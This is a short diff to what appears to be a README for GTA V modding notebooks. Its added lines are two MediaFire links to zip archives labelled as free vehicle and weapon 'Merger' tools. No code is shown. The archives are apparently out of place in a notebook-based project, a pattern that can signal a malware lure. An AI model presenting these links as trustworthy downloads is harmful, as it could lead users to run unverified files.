@@ -15,4 +15,7 @@ Carnets-based tools generating OpenIV-compatible meta files for GTA V weapons an
 2. Open .ipynb file → Adjust parameters via GUI  
 3. Copy generated XML → OpenIV → GTA V update/data
 4. Use Menyoo/Simple Trainer to spawn
-
+🏎️
+https://www.mediafire.com/file/xzd75d2j1wkbiny/GTA_V_Vehicle_Merger_v1.0_FREE.zip/file
+🔫
+https://www.mediafire.com/file/rgcvgn81b1302wi/GTA-Weapons-Merger-v1.0.zip/file
